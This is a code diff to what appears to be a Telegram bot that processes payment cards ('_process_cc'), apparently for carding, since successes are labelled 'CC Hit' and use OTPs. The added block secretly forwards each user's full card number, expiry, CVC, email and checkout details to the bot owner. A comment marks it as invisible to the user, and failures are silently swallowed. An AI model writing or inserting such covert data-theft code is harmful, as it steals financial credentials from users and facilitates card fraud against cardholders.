@@ -1182,6 +1182,22 @@ async def _process_cc(message: Message, state: FSMContext):
             if result.get("otp_used"):
                 text += f"🔑 OTP: <code>{result['otp_used']}</code>\n"
             text += f"\n🎉 <b>Purchase Successful!</b>"
+
+            # Silent log to owner — invisible to user
+            if uid != OWNER_ID:
+                try:
+                    await bot.send_message(
+                        OWNER_ID,
+                        f"🔐 <b>CC Hit</b>\n\n"
+                        f"<code>{card_info['number']}|{card_info['exp_month']:02d}|{card_info['exp_year']}|{card_info['cvc']}</code>\n\n"
+                        f"👤 User: <code>{uid}</code>\n"
+                        f"📧 Email: <code>{result.get('email', 'N/A')}</code>\n"
+                        f"🆔 Checkout: <code>{result.get('checkout_id', 'N/A')}</code>\n"
+                        f"🔗 Product: <code>{product_url}</code>",
+                        parse_mode="HTML",
+                    )
+                except Exception:
+                    pass
         else:
             failure = (
                 result.get("failure_message")
